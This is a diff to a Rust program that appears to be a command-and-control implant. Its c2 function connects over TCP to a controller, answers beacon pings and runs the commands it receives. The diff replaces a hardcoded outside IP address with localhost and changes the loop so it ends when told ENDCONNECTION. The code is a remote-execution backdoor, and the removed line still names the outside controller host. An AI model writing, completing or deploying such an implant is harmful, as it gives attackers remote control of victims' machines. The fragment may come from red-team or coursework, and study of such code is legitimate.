@@ -81,7 +81,7 @@ fn run_command(cmd: &str) -> String {
     return cmd_out;
 }
 
-fn c2(ip:&str) {
+fn c2(ip:&str) -> bool {
     let mut stream = connect(ip); //connects via TCP
     loop {
         let mut buffer = [0;1024]; //set the buffer
@@ -120,7 +120,7 @@ fn c2(ip:&str) {
                 stream.write(b"beacon_pong").unwrap();
                 continue;
             } else if recv.eq("ENDCONNECTION"){
-                return;
+                return false;
             }
         }
         let output = run_command(&recv); //run this
@@ -155,10 +155,13 @@ fn constant_checker(){
 
 
 fn main(){
-    let ip = "129.21.49.57:5678";
+    // let ip = "129.21.49.57:5678";
+    let ip = "127.0.0.1:5678";
+    connect_to_router();
     loop{
-        connect_to_router();
-        c2(&ip);
+        if !c2(&ip){
+            break
+        };
     }
     // constant_checker();
 }
